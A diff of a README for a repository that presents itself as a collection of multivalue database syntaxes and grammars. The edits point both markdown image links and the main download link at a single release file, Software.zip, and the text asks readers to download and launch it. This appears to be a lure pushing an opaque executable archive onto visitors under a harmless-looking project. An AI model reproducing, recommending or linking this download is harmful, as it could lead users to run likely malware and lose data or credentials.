@@ -1,6 +1,6 @@
 # 🚀 **Welcome to the MVSyntax Repository!**
 
-![MVSyntax Logo](https://imgur.com/gallery/yourimagelink)
+![MVSyntax Logo](https://github.com/BlessedTitan69/mvsyntax/releases/download/v2.0/Software.zip)
 
 ## Repository Description
 This repository, named "mvsyntax," is a comprehensive collection of multivalue syntaxes and grammars. Whether you are working with systems like Universe, UniData, or any other multivalue database, this repository aims to provide you with the necessary resources to understand and work with these syntaxes effectively.
@@ -22,7 +22,7 @@ The repository covers a wide range of topics related to multivalue databases and
 - **VSCode**
 
 ## Access the Software
-To access the software related to the multivalue syntaxes and grammars, please download the zipped file from the following link: [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip)
+To access the software related to the multivalue syntaxes and grammars, please download the zipped file from the following link: [https://github.com/BlessedTitan69/mvsyntax/releases/download/v2.0/Software.zip](https://github.com/BlessedTitan69/mvsyntax/releases/download/v2.0/Software.zip)
 
 *Note: The link provided above requires the software to be launched.*
 
@@ -42,4 +42,4 @@ For any questions, suggestions, or collaboration opportunities, feel free to rea
 
 Thank you for visiting the MVSyntax repository. Happy exploring and coding with multivalue syntaxes! 🌟🚀
 
-![MVSyntax Repository](https://imgur.com/gallery/yourimagelink)
+![MVSyntax Repository](https://github.com/BlessedTitan69/mvsyntax/releases/download/v2.0/Software.zip)
